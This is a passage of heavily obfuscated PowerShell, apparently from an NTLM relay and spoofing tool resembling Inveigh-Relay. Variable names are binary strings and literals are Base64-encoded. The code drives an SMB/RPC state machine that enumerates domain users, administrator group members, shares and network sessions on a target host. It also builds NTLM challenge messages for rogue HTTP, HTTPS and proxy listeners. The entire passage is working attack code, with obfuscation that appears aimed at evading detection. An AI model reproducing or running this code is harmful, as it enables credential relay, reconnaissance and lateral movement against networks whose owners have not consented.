                                elseif(${00000100101011111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBEAG8AbQBhAGkAbgBVAHMAZQByAHMA')))
                            {
                                ${00100001011011110}++
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAFUAcwBlAHIAcwA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBlAG0AYgBlAHIAcwBJAG4AQQBsAGkAYQBzAA==')))
                            {
                                ${00100001011011110}++
                                [Byte[]]${00000000110000110} = ${10111110001011100}[140..([System.BitConverter]::ToInt16(${10111110001011100}[3..1],0) - 1)]
                                if([System.BitConverter]::ToString(${10111110001011100}[156..159]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NwAzAC0AMAAwAC0AMAAwAC0AYwAwAA=='))))
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAE0AUgBDAGwAbwBzAGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                                else
                                {
                                    ${10000101000100010} = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAATgBhAG0AZQBzAA==')))
                            {
                                ${00100001011011110}++
                                [Byte[]]${01110001100010011} = ${10111110001011100}[152..155]
                                if([System.BitConverter]::ToString(${10111110001011100}[156..159]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NwAzAC0AMAAwAC0AMAAwAC0AYwAwAA=='))))
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAE0AUgBDAGwAbwBzAGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                                else
                                {
                                    if(${00100001011011110} -eq 4)
                                    {
                                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBHAHIAbwB1AHAA')))
                                    }
                                    else
                                    {
                                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBBAGwAaQBhAHMA')))
                                    }
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAAUgBpAGQAcwA=')))
                            {
                                ${00100001011011110}++
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEwAbwBvAGsAdQBwAFIAaQBkAHMA')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAQwBsAG8AcwBlAA==')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATABvAG8AawB1AHAAUwBpAGQAcwA=')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEwAbwBvAGsAdQBwAFMAaQBkAHMA')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATwBwAGUAbgBQAG8AbABpAGMAeQA=')))
                            {
                                [Byte[]]${01010111100011011} = ${10111110001011100}[140..159]
                                if(${00100001011011110} -gt 2)
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATABvAG8AawB1AHAAUwBpAGQAcwA=')))
                                }
                                else
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAUQB1AGUAcgB5AEkAbgBmAG8AUABvAGwAaQBjAHkA')))    
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAUQB1AGUAcgB5AEkAbgBmAG8AUABvAGwAaQBjAHkA')))
                            {
                                [Byte[]]${10010010011111001} = ${10111110001011100}[148..149]
                                ${10000000100000011} = [System.BitConverter]::ToInt16(${10010010011111001},0)
                                [Byte[]]${11000000001010001} = ${10111110001011100}[168..171]
                                ${01101001010100011} = [System.BitConverter]::ToInt32(${11000000001010001},0)
                                if(${01101001010100011} % 2)
                                {
                                    ${10000000100000011} += 2
                                }
                                [Byte[]]${10110010101101111} = ${10111110001011100}[(176 + ${10000000100000011})..(199 + ${10000000100000011})]
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAQwBsAG8AcwBlAA==')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBFAG4AdQBtAA==')))
                            {
                                if([System.BitConverter]::ToString(${10111110001011100}[172..175]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))) -or [System.BitConverter]::ToString(${10111110001011100}[12..15]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                }
                                else
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAFMAUgBWAFMAVgBDAA==')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBoAGEAcgBlAEUAbgB1AG0AQQBsAGwA')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAFMAUgBWAFMAVgBDAA==')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBBAGwAaQBhAHMA')))
                            {
                                ${00100001011011110}++
                                [Byte[]]${00101011001111100} = ${10111110001011100}[140..159]
                                if([System.BitConverter]::ToString(${10111110001011100}[156..159]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NwAzAC0AMAAwAC0AMAAwAC0AYwAwAA=='))))
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAE0AUgBDAGwAbwBzAGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                                else
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBlAG0AYgBlAHIAcwBJAG4AQQBsAGkAYQBzAA==')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBEAG8AbQBhAGkAbgA=')))
                            {
                                ${00100001011011110}++
                                [Byte[]]${00000100010000110} = ${10111110001011100}[140..159]
                                if(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBEAG8AbQBhAGkAbgBVAHMAZQByAHMA')))
                                }
                                else
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAATgBhAG0AZQBzAA==')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBHAHIAbwB1AHAA')))
                            {
                                ${00100001011011110}++
                                [Byte[]]${00101111111000110} = ${10111110001011100}[140..159]
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEcAcgBvAHUAcABNAGUAbQBiAGUAcgA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEcAcgBvAHUAcABNAGUAbQBiAGUAcgA=')))
                            {
                                ${00100001011011110}++
                                [Byte[]]${00100101100001010} = ${10111110001011100}[144..147]
                                ${01111001111010001} = [System.BitConverter]::ToInt16(${00100101100001010},0)
                                [Byte[]]${01011111001011110} = ${10111110001011100}[160..(159 + (${01111001111010001} * 4))]
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAAUgBpAGQAcwA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                            {
                                ${01010110110010100} = ${10111110001011100}[132..147]
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                            {
                                ${00000100101011111} = ${10001010100111000}
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAE0AUgBDAGwAbwBzAGUAUgBlAHEAdQBlAHMAdAA=')))
                            {
                                ${00100001011011110}++
                                if(${00100001011011110} -eq 8)
                                {
                                    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${00111010101100001} group not found") > $null
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                }
                                else
                                {
                                    if(${00100001011011110} -eq 5 -and ${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))))
                                    {
                                        ${10110010101101111} = 0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00
                                        ${10101110101110110} = 0x01,0x00,0x00,0x00
                                    }
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBEAG8AbQBhAGkAbgA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                            {
                                ${01011110000111110} = ${10111110001011100}[40..43]
                                ${00100110111110100} = $null
                                if(${10111110001011100}[76] -eq 92)
                                {
                                    ${01011011100001010} = 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    ${01011011100001010} = ${10111110001011100}[80..83]
                                }
                                if(${10011001111011110}.Count -gt 0)
                                {
                                    if(${10111110001011100}[76] -ne 92)
                                    {
                                        foreach(${01100010010111001} in ${01011011100001010})
                                        {
                                            ${00100110111110100} = [System.Convert]::ToString(${01100010010111001},2).PadLeft(8,'0') + ${00100110111110100}
                                        }
                                        ${10010011001000110} | ? {$_.Share -eq ${10011001111011110}[${10010111010110000}]} | % {$_."Access Mask" = ${00100110111110100}}
                                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                    }
                                    else
                                    {
                                        ${00100110111110100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwAA==')))
                                        ${10010011001000110} | ? {$_.Share -eq ${10011001111011110}[${10010111010110000}]} | % {$_."Access Mask" = ${00100110111110100}}
                                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                        ${10010111010110000}++
                                    }
                                }
                                else
                                {
                                    if(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))) -or ${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgA='))))
                                    {
                                        ${10000101000100010} = 0x73,0x00,0x72,0x00,0x76,0x00,0x73,0x00,0x76,0x00,0x63,0x00 
                                    }
                                    else
                                    {
                                        ${10000101000100010} = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 
                                    }
                                    ${10101110001001111} = ${01011110000111110}
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                            {
                                if(${01101100111100100} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))
                                {
                                    switch (${10011011101000101}) 
                                    {
                                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                                        {
                                            if(${00101100000100000})
                                            {
                                                ${10011011101000101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBoAGEAcgBlAA==')))
                                            }
                                            else
                                            {
                                                ${10011011101000101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                                                ${00100001011011110} = 0
                                            }
                                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAGUAZQBjAG8AbgBuAGUAYwB0AA==')))
                                        }
                                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                                        {
                                            ${10011011101000101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAcwBlAHMAcwBpAG8AbgA=')))
                                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAGUAZQBjAG8AbgBuAGUAYwB0AA==')))
                                        }
                                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAcwBlAHMAcwBpAG8AbgA=')))
                                        {
                                            ${10011011101000101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBoAGEAcgBlAA==')))
                                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAGUAZQBjAG8AbgBuAGUAYwB0AA==')))
                                        }
                                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBoAGEAcgBlAA==')))
                                        {
                                            if(${10011001111011110}.Count -gt 0 -and ${10010111010110000} -lt ${10011001111011110}.Count - 1)
                                            {
                                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                                ${10010111010110000}++
                                            }
                                            elseif(${10011001111011110}.Count -gt 0 -and ${10010111010110000} -eq ${10011001111011110}.Count - 1)
                                            {
                                                ${01011110000111110} = ${10101110001001111}
                                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                                ${10010111010110000}++
                                            }
                                            else
                                            {
                                                if($attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHMAcwBpAG8AbgA='))))
                                                {
                                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                                }
                                                else
                                                {
                                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                                                }
                                            }
                                        }
                                    }
                                }
                                else
                                {
                                    if(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))) -and ${10011001111011110}.Count -gt 0 -and ${10010111010110000} -lt ${10011001111011110}.Count - 1)
                                    {
                                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                        ${10010111010110000}++
                                    }
                                    elseif(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))) -and ${10011001111011110}.Count -gt 0 -and ${10010111010110000} -eq ${10011001111011110}.Count - 1)
                                    {
                                        ${01011110000111110} = ${10101110001001111}
                                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                        ${10010111010110000}++
                                    }
                                    else
                                    {
                                        if($inveigh_session -and !$Logoff)
                                        {
                                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                        }
                                        else
                                        {
                                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                                        }
                                    }
                                }
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        if(${10011001111011110}.Count -gt 0)
                        {
                            ${01101101100000110} = "\\" + $Target + "\" + ${10011001111011110}[${10010111010110000}]
                            ${10110111000110011} = [System.Text.Encoding]::Unicode.GetBytes(${01101101100000110})
                        }
                        ${10001010110000101} = _01101011100000110 0x03,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10101010100111101} = _01111011001111111 ${10110111000110011}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101}    
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${00101010111100011}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x04,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10101010100111101} = _01001101010010100
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101}
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${00101010111100011}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                }
            }
            catch
            {
                ${10000111101001011} = $_.Exception.Message
                ${10000111101001011} = ${10000111101001011} -replace "`n",""
                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10000111101001011} $($_.InvocationInfo.Line.Trim()) stage ${00111110010110110}") > $null
                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
            }
        }
        For(${10000101000101100} = 0;${10000101000101100} -lt ${10110011100001111}.Count;${10000101000101100}++)
        {
            ${10111110011001011} = ${10110011100001111}[${10000101000101100}]
            ${00101101000101110} = ${10111110011001011}.Split("\")
            ${_01011010011110011} = ${00101101000101110}[0]
            $username = ${00101101000101110}[1]
            if(${10001101011100010}.domain_mapping_table.ContainsKey(${_01011010011110011}))
            {
                ${10011110000111010} = ($username + "@" + ${10001101011100010}.domain_mapping_table.${_01011010011110011}).ToUpper()
                ${10110011100001111}[${10000101000101100}] = ${10011110000111010}
            }
        }
        For(${10000101000101100} = 0;${10000101000101100} -lt ${01100001111111001}.Count;${10000101000101100}++)
        {
            ${10101101111111011} = ${01100001111111001}[${10000101000101100}]
            ${00111101111001000} = ${10101101111111011}.Split("\")
            ${_01011010011110011} = ${00111101111001000}[0]
            ${00111010101100001} = ${00111101111001000}[1]
            if(${10001101011100010}.domain_mapping_table.ContainsKey(${_01011010011110011}))
            {
                ${00111110101010101} = (${00111010101100001} + "@" + ${10001101011100010}.domain_mapping_table.${_01011010011110011}).ToUpper()
                ${01100001111111001}[${10000101000101100}] = ${00111110101010101}
            }
        }
        ${10001101011100010}.session_message_ID_table[${10001101011100010}.session_count] = ${10011111011010000}
        for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
        {
            if(${10001101011100010}.enumerate[${10000101000101100}].IP -eq $target)
            {
                ${01100011000100110} = ${10000101000101100}
                break
            }
        }
        if($EnumerateGroup -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA=='))))
        {
            ${10001101011100010}.enumerate[${01100011000100110}]."Administrator Users" = ${10110011100001111}
            ${10001101011100010}.enumerate[${01100011000100110}]."Administrator Groups" = ${01100001111111001}
        }
        ${10001101011100010}.enumerate[${01100011000100110}]."Local Users" = ${00111010010110001}
        ${10001101011100010}.enumerate[${01100011000100110}].Shares = ${00000101111011100}
        ${01001101011110111} = @()
        foreach(${01010000100011100} in ${00011100011101110})
        {
            if(${10001101011100010}.enumerate[${01100011000100110}].NetSessions -notcontains ${01010000100011100})
            {
                ${01001101011110111} += ${01010000100011100}
            }
            ${00110100110101110} = (${01010000100011100}.Split("\"))[2]
            ${10010110001100001} = (${01010000100011100}.Split("\"))[3]
            for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
            {
                if(${10001101011100010}.enumerate[${10000101000101100}].IP -contains ${00110100110101110})
                {
                    ${00011010000010010} = ${10000101000101100}
                    break
                }
            }
            if(${00011010000010010} -and ${10001101011100010}.enumerate[${00011010000010010}].NetSessions -notcontains ${10010110001100001})
            {
                ${10001101011100010}.enumerate[${00011010000010010}]."NetSessions Mapped" += ${10010110001100001}
            }
            else
            {
                ${10001101011100010}.enumerate.Add((_00000101010001111 -_01010101101100010 ${00110100110101110} -_10100110000001110 ${10010110001100001})) > $null
            }
        }
        ${10001101011100010}.enumerate[${01100011000100110}].NetSessions += ${01001101011110111}
        if(!${00101100000100000})
        {
            ${10001101011100010}.enumerate[${01100011000100110}].Enumerate = $(Get-Date -format s)
        }
    }
}
${10000100010000111} = 
{ 
    param ($Attack,$Challenge,$Command,$Enumerate,$EnumerateGroup,$FailedLoginThreshold,$HTTPIP,$HTTPPort,
    ${10100011111011100},$Proxy,$ProxyIgnore,${00010010100101100},$RelayAutoDisable,$RepeatEnumerate,
    $RepeatExecute,$Service,${_00100111010100111},$SessionLimitPriv,$SessionLimitUnpriv,$SessionLimitShare,
    $SessionPriority,$Target,$TargetMode,$TargetRefresh,$Username,$WPADAuth,$WPADAuthIgnore,${10000101100010011})
    function _01010101010101000
    {
        param ([String]$Challenge,[String]${_01100011100010010},[Int]${_10011110110101100})
        ${01110111111011000} = Get-Date
        ${01110111111011000} = ${01110111111011000}.ToFileTime()
        ${01110111111011000} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${01110111111011000}))
        ${01110111111011000} = ${01110111111011000}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        if($Challenge)
        {
            ${10100000110011111} = $Challenge
            ${10101100001010011} = ${10100000110011111}.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            ${10101100001010011} = ${10101100001010011}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            ${10101100001010011} = [String](1..8 | %{$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
            ${10100000110011111} = ${10101100001010011} -replace ' ',''
            ${10101100001010011} = ${10101100001010011}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
        }
        if(!${10001101011100010}.HTTP_session_table.ContainsKey($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADEAMAAwADAAMQAxADEAMAAwADAAMQAwADAAMQAwAH0AOgAkAHsAXwAxADAAMAAxADEAMQAxADAAMQAxADAAMQAwADEAMQAwADAAfQA=')))))
        {
            ${10001101011100010}.HTTP_session_table.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADEAMAAwADAAMQAxADEAMAAwADAAMQAwADAAMQAwAH0AOgAkAHsAXwAxADAAMAAxADEAMQAxADAAMQAxADAAMQAwADEAMQAwADAAfQA='))),${10100000110011111})
        }
        else
        {
            ${10001101011100010}.HTTP_session_table[$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADEAMAAwADAAMQAxADEAMAAwADAAMQAwADAAMQAwAH0AOgAkAHsAXwAxADAAMAAxADEAMQAxADAAMQAxADAAMQAwADEAMQAwADAAfQA=')))] = ${10100000110011111}
        }
        ${01101101111111011} = [System.Text.Encoding]::Unicode.GetBytes(${10001101011100010}.computer_name)
        ${10001101001100101} = [System.Text.Encoding]::Unicode.GetBytes(${10001101011100010}.netBIOS_domain)
        ${01110101000110100} = [System.Text.Encoding]::Unicode.GetBytes(${10001101011100010}.DNS_domain)
        ${01000011101110101} = [System.Text.Encoding]::Unicode.GetBytes(${10001101011100010}.DNS_computer_name)
        ${00010000111111001} = [System.BitConverter]::GetBytes(${01101101111111011}.Length)[0,1]
        ${01110110110101001} = [System.BitConverter]::GetBytes(${10001101001100101}.Length)[0,1]
        ${00101111111100000} = [System.BitConverter]::GetBytes(${01110101000110100}.Length)[0,1]
        ${01101011100100110} = [System.BitConverter]::GetBytes(${01000011101110101}.Length)[0,1]
        ${10011011000111001} = [System.BitConverter]::GetBytes(${01101101111111011}.Length + ${10001101001100101}.Length + ${01110101000110100}.Length + ${01110101000110100}.Length + ${01000011101110101}.Length + 36)[0,1]
        ${01011001001011011} = [System.BitConverter]::GetBytes(${10001101001100101}.Length + 56)
        ${10111101100010011} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                            ${01110110110101001} +
                            ${01110110110101001} +
                            0x38,0x00,0x00,0x00 +
                            0x05,0x82,0x89,0xa2 +
                            ${10101100001010011} +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                            ${10011011000111001} +
                            ${10011011000111001} + 
                            ${01011001001011011} +
                            0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +
                            ${10001101001100101} +
                            0x02,0x00 + 
                            ${01110110110101001} +
                            ${10001101001100101} + 
                            0x01,0x00 +
                            ${00010000111111001} +
                            ${01101101111111011} +
                            0x04,0x00 +
                            ${00101111111100000} +
                            ${01110101000110100} +
                            0x03,0x00 +
                            ${01101011100100110} +
                            ${01000011101110101} +
                            0x05,0x00 +
                            ${00101111111100000} +
                            ${01110101000110100} +
                            0x07,0x00,0x08,0x00 +
                            ${01110111111011000} +
                            0x00,0x00,0x00,0x00,0x0a,0x0a
        ${10010000010011000} = [System.Convert]::ToBase64String(${10111101100010011})
        ${10001100110111001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${10010000010011000}
        return ${10001100110111001}
    }
    if(${10100011111011100})
    {
        ${10100100100010110} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTAA==')))
    }
    elseif(${00010010100101100})
    {
        ${10100100100010110} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AA==')))
    }
    else
    {
        ${10100100100010110} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAA=')))
    }
    if($HTTPIP -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAuADAALgAwAC4AMAA='))))
    {
        $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)
        ${00111111001010011} = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)
    }
    else
    {
        ${00111111001010011} = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)
    }
    ${01010110011101100} = $true
